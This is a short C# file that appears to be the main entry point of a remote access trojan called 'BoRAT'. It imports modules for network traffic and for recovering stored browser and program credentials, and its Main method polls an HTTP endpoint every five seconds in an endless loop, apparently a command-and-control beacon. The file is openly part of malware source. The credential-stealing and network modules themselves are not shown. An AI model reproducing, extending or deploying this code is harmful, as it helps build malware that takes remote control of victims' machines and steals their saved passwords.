using System;
using BoRAT.Core.Network;
using BoRAT.Core.Recovery.Programs;
using BoRAT.Core.Data;
using BoRAT.Core.Recovery.Browsers;
using System.Threading;

namespace BoRAT
{
    class Program
    {
        static void Main(string[] args)
        {
            while (true)
            {
                Http.Request();
                Thread.Sleep(5000);
            }

            Console.ReadKey();
        }

      
    }
}
